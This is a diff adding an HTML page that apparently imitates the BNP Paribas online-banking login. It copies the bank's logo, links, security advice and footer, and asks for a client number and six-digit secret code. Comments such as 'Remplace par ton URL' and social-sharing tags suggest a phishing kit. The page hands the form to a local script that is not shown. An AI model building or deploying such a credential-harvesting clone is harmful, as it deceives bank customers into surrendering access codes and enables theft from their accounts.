@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ma banque Bnp</title>
+
+    <!--===========BOXICON LINK==========-->
+    <link rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
+  <!-- or -->
+  <link rel="stylesheet"
+  href="https://unpkg.com/boxicons@latest/css/boxicons.min.css">
+    <!--=================================-->
+
+
+<!--========== SEO DESCRIPTION ==========-->
+<meta name="description" content="Accédez à votre espace BNP Paribas en toute sécurité. Authentification sécurisée et services bancaires en ligne.">
+
+<!--========== OPEN GRAPH POUR FACEBOOK/WHATSAPP ==========-->
+<meta property="og:title" content="Authentification - BNP Paribas fortid">
+<meta property="og:description" content="Accédez à votre espace BNP Paribas en toute sécurité. Authentification sécurisée et services bancaires en ligne.">
+<meta property="og:image" content="https://www.franceinfo.fr/pictures/kIQdCxd6QyTYXI9xuGwMhhlNjYk/0x192:2048x1344/908x510/2025/03/07/whatsapp-image-2025-03-07-at-19-15-11-67cb3b257cc5c576383508.jpg"> <!-- Remplace par ton URL -->
+<meta property="og:type" content="website">
+
+
+<!--========== TWITTER CARD ==========-->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Authentification - BNP Paribas">
+<meta name="twitter:description" content="Accédez à votre espace BNP Paribas en toute sécurité. Authentification sécurisée et services bancaires en ligne.">
+
+    <!--=========GOOGLE FONT 1============-->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Oswald:wght@200..700&display=swap" rel="stylesheet">
+
+    <!--=========GOOGLE FONT 2============-->
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=M+PLUS+Rounded+1c&family=Oswald:wght@200..700&display=swap" rel="stylesheet">
+    <!--================================-->
+
+    <link rel="stylesheet" href="styles.css">
+    <link rel="shortcut icon" href="faviiiiii.ico" type="image/x-icon">
+</head>
+<body>
+
+<header>
+    <div class="logo">
+        
+        <a href="https://mabanque.bnpparibas/#">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/BNP_Paribas_Asset_Management.svg/2560px-BNP_Paribas_Asset_Management.svg.png" alt="Logo du site">
+        </a>
+    </div>
+    <div class="header-right">
+        <div class="search-logo">
+            <a href="https://mabanque.bnpparibas/#">
+                <i class='bx bx-search' style='color:rgba(0,0,0,0.48); font-size: 24px;'></i>
+            </a>
+        </div>
+        <hr class="vertical-hr">
+        <div class="other-logo">
+            <i class='bx bxs-lock' style='color:#049001; font-size: 24px;'></i>
+        </div>
+    </div>
+</header>
+<br>
+<br>
+
+
+<!--==========LES CADRANTS===========-->
+<div class="container">
+    <div class="left-side">
+        <div class="authentication-form">
+            <h2>ACCÉDER À MES COMPTES</h2>
+            <form id="loginForm" action="#" method="post">
+                <label for="clientNumber">1. Mon numéro client</label>
+                <input type="text" id="clientNumber" name="clientNumber" required>
+                <label for="secretCode">2. Mon code secret (6 chiffres)</label>
+                <input type="password" id="secretCode" name="secretCode" minlength="6" maxlength="6" readonly onfocus="this.removeAttribute('readonly');" required>
+                <div class="numeric-keypad">
+                    <button type="button" class="key">1</button>
+                    <button type="button" class="key">2</button>
+                    <button type="button" class="key">3</button>
+                    <button type="button" class="key">4</button>
+                    <button type="button" class="key">5</button>
+                    <button type="button" class="key">6</button>
+                    <button type="button" class="key">7</button>
+                    <button type="button" class="key">8</button>
+                    <button type="button" class="key">9</button>
+                    <button type="button" class="key">0</button>
+                </div>
+                <button type="submit">Accéder à mes comptes</button>
+            </form>
+        </div>
+        <br>
+        <a href="https://mabanque.bnpparibas" class="oublie"><p>Numéro client ou code secret oublié?</p></a>
+        
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+
+
+    </div>
+    <div class="right-side">
+        <!-- Contenu du second cadrant (35%) -->
+        <h3 class="titres"> <i class='bx bxs-lock-alt' undefined ></i>Vos codes d'accès</h3>
+        <a href="https://mabanque.bnpparibas/fr/gerer/services-lies-compte/options-et-services/code-acces-compte-en-ligne" class="titr">Obtenir ses codes d'accès</a>
+        <hr>
+        <h3 class="titres"> <i class='bx bxs-shield-plus'></i>Conseils de sécurité</h3>
+        <p class="titre">Vérifiez que l'adresse du site commence exactement par :
+
+            <a href="https://connexion-mabanque.bnpparibas" class="titi">https://connexion-mabanque.bnpparibas</a>
+            
+            précédée par une icône cadenas et contient un https:// qui garantiront une connexion sécurisée.</p>
+
+        <p class="titre"><a href="https://mabanque.bnpparibas/fr/engagement-chartes-et-conventions/site-securise" class="titr">Découvrez nos conseils sécurité </a>et les bonnes pratiques pour consulter et identifier les dangers du web.</p>
+        <hr>
+        <h3 class="titres"> <i class='bx bx-low-vision' ></i>Pour une meilleure accessibilité</h3>
+        <p class="titre"><a href="https://connexion-mabanque.bnpparibas/login?service=%2Foauth2.0%2FcallbackAuthorize%3Fclient_id%3D0e0fe16f-4e44-4138-9c46-fdf077d56087%26scope%3Dopenid%2Bbnpp_mabanque%2Bikpi%26redirect_uri%3Dhttps%253A%252F%252Fmabanque.bnpparibas%252Fauth%252Fon-login%26response_type%3Dcode%26state%3DqoND6z1rzYFuSl3iBeilYOYE%26nonce%3DqLzm0tI3%26client_name%3DCasOAuthClient" class="titr">Connectez-vous</a> grâce à la grille contrastée, agrandie et bénéficiez d'un accompagnement vocal.</p>
+        <p class="titre"><a href="https://ws.facil-iti.com" class="titr">Utilisez Facil'iti </a>pour personnaliser l'affichage en fonction de votre situation (handicap visuel ou cognitif).</p>
+        <p class="titre"><a href="https://mabanque.bnpparibas/fr/accessibilite/acceo" class="titr">Accédez au service Sourds et Malentendants, Sourds et Aveugles ou Aphasiques</a>pour contacter un conseiller avec un dispositif en LSF (Langue des Signes Française), en LPC (Langage Parlé Complété) ou en TIP (Transcription Instantanée de la Parole).</p>
+        <p class="titre"><a href="https://mabanque.bnpparibas/fr/accessibilite" class="titr">Rendez-vous sur la page Accessibilité</a>pour plus d'informations sur l'accessibilité numérique chez BNP Paribas.</p>
+        <hr>
+        <h3 class="titres"><i class='bx bxs-phone-call' ></i>Informations client</h3>
+        <p class="titre">Si vous rencontrez des problèmes techniques lors de votre navigation, nous vous invitons à contacter nos conseillers en ligne au : <span class="black">3477 Service gratuit + prix appel</span></p>
+        <p class="titre">ou à nous <a href="https://mabanque.bnpparibas/fr/nous-contacter/nous-contacter/faq-assistance-technique" class="titr">signaler un problème technique.</a><br>Vous pouvez également gérer vos comptes depuis votre mobile ou votre tablette via l'application <a href="https://mabanque.bnpparibas/fr/ma-banque-et-moi/nos-applications" class="titr">Mes comptes</a>.</p>
+
+       
+
+    </div>
+</div>
+<!--===================================-->
+
+<footer class="footer">
+    
+    <div class="social-icons">
+        <h3 class="suivre">Suivez-nous sur :</h3>
+        <a href="https://www.facebook.com/mabanque.bnpparibas"><i class='bx bxl-facebook' style='color:#ffffff; font-size: 24px;'></i></a>
+        <a href="https://x.com/mabanque_bnpp"><i class='bx bxl-twitter' style='color:#ffffff; font-size: 24px;'></i></a>
+        <a href="https://x.com/mabanque_bnpp"><i class='bx bxl-youtube' style='color:#ffffff; font-size: 24px;'></i></a>
+        <a href="https://www.instagram.com/mabanquebnpparibas/"><i class='bx bxl-instagram' style='color:#ffffff; font-size: 24px;'></i></a>
+        <a href="https://www.linkedin.com/company/bnp-paribas/"><i class='bx bxl-linkedin' style='color:#ffffff; font-size: 24px;'></i></a>
+    </div>
+    <div class="footer-links">
+        <div>
+            <a href="https://mabanque.bnpparibas/fr/nous-contacter/nous-contacter" class="title">CONTACT</a>
+            <a href="https://mabanque.bnpparibas/fr/nous-contacter/nous-contacter">Nos conseillers vous répondent par téléphone, chat, mail ou bien encore grâce à nos SAV Facebook et Twitter.</a>
+            
+        </div>
+        <div>
+            <a href="https://mabanque.bnpparibas/fr/nous-contacter/nous-trouver/trouver-une-agence" class="title">TROUVER UNE AGENCE</a>
+            <a href="https://mabanque.bnpparibas/fr/nous-contacter/nous-trouver/trouver-une-agence">Retrouvez facilement l’agence la plus proche avec ses horaires d’ouverture et les services disponibles.</a>
+            
+        </div>
+        <div>
+            <a  href="https://mabanque.bnpparibas/fr/ma-banque-et-moi/nos-applications" class="title">LES APPLICATIONS MOBILES</a>
+            <a href="https://mabanque.bnpparibas/fr/ma-banque-et-moi/nos-applications" >Découvrez nos applications mobiles pour gérer vos comptes, payer avec votre mobile et vous simplifier la vie.</a>
+           
+        </div>
+    </div>
+    <hr>
+    <!-- ===============AUTRES PARTIE DU FOOTER============== -->
+
+
+
+    <div class="footer-links">
+        <div>
+            <a href="#" class="pario">INFORMATIONS LÉGALES</a>
+            <a href="https://mabanque.bnpparibas/fr/espace-donnees-personnelles">Données personnelles</a>
+            <a href="https://mabanque.bnpparibas/fr/engagement-chartes-et-conventions/mentions-legales">Mentions légales</a>
+            <a href="https://mabanque.bnpparibas/fr/engagement-chartes-et-conventions/cookies">Cookies</a>
+            <a href="https://mabanque.bnpparibas/fr/reglementation">Réglementation</a>
+            <a href="https://mabanque.bnpparibas/fr/reglementation/fonds-de-garantie-des-depots-et-de-resolution">Fonds de Garantie des Dépôts et <br>résolution</a>
+            
+            
+        </div>
+        <div>
+            <a href="#" class="pario">NOUS CONNAÎTRE</a>
+            <a href="https://mabanque.bnpparibas/fr/ma-banque-et-moi/la-banque-d-un-monde-qui-change">La banque d’un monde qui change</a>
+            <a href="https://mabanque.bnpparibas/fr/ma-banque-et-moi/engagements-responsables">Nos engagements responsables</a>
+            <a href="https://group.bnpparibas/emploi-carriere">Emploi & Carrière</a>
+            
+        </div>
+        <div>
+            <a href="#" class="pario">INFORMATIONS</a>
+            <a href="https://mabanque.bnpparibas/fr/accessibilite">Site Accessible</a>
+            <a href="https://mabanque.bnpparibas/fr/engagement-chartes-et-conventions/site-securise">Site Sécurisé</a>
+            <a href="https://mabanque.bnpparibas/fr/devenir-client-bnp-paribas/conditions-eligibilite">Conditions d’éligibilité</a>
+            <a href="https://mabanque.bnpparibas/fr/notre-offre/tarifs-et-conditions-bnp-paribas/conditions-tarifaires">Tarifs et conditions</a>
+            <a href="https://mabanque.bnpparibas/fr/glossaire">Glossaire</a>
+            <a href="https://mabanque.bnpparibas">Guides et brochures</a>
+           
+        </div>
+        <div>
+            <a href="#" class="pario">NOS AUTRES SITES</a>
+            <a href="https://mabanquepro.bnpparibas">Les Professionnels</a>
+            <a href="https://banqueentreprise.bnpparibas">Les Entreprises</a>
+            <a href="https://associations.bnpparibas.fr/fr/web/world/assos/index186/">Les Associations</a>
+            <a href="https://mabanqueprivee.bnpparibas">La Banque Privée</a>
+            <a href="https://www.hellobank.fr">La Banque en ligne</a>
+            <a href="https://group.bnpparibas">Le Groupe BNP Paribas</a>
+           
+        </div>
+    </div>
+    
+
+    <p class="titresss">Pour la bonne exécution de vos contrats, et en cas de réclamations/contestations, votre Conseiller est joignable sur sa ligne directe (appel non surtaxé). Si vous ne disposez plus de son numéro de téléphone direct, envoyez-lui un message par votre messagerie sécurisée, il vous le donnera à nouveau en retour.</p>
+   
+</footer>
+
+
+<!-- Le reste du contenu de ta page -->
+
+<script src="index.js"></script>
+
+</body>
+</html>
